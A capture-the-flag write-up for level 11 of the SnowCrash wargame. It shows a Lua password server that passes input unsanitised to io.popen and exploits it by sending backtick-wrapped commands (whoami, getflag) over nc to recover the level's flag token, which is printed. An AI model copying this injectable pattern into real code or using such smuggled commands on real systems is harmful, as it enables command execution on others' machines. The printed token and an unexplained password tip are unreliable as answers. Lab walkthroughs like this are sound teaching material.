In the folder **home** there is a file **level11.lua** that contains :

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()
	data = string.sub(data, 1, 40)
	return data
end

while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local l, err = client:receive()
	if not err then
		print("trying " .. l)
		local h = hash(l)
		if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
			client:send("Erf nope..\n");
		else
			client:send("Gz you dumb*\n")
		end
	end
	client:close()
end
```

We observe that the program is launched on **127.0.0.1:5151**, so in order to be able to interact with it we use :
<pre><code>> nc 127.0.0.1 5151
Password:
Erf nope..</code></pre>

Looking at the program more closely, we realize that an injection is possible <code>io.popen("echo "..pass..." | sha1sum", "r")</code> because it executes the variable **pass**, which is our input.
Moreover the second part of the code is useless because no matter what the password is, the program ends with a simple message.
> The correct password is: **NotSoEasy** (add a -n in front to make it work)

We're trying :
<pre><code>> nc 127.0.0.1 5151
Password: `whoami > /tmp/test`
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
flag11
</code></pre>
> We store the result in a file because otherwise there is no display: it is not a <code>client:send()</code>

<pre><code>> nc 127.0.0.1 5151
Password: `getflag > /tmp/test`
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
</code></pre>

<pre>
<code>> getflag</code>
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
</pre>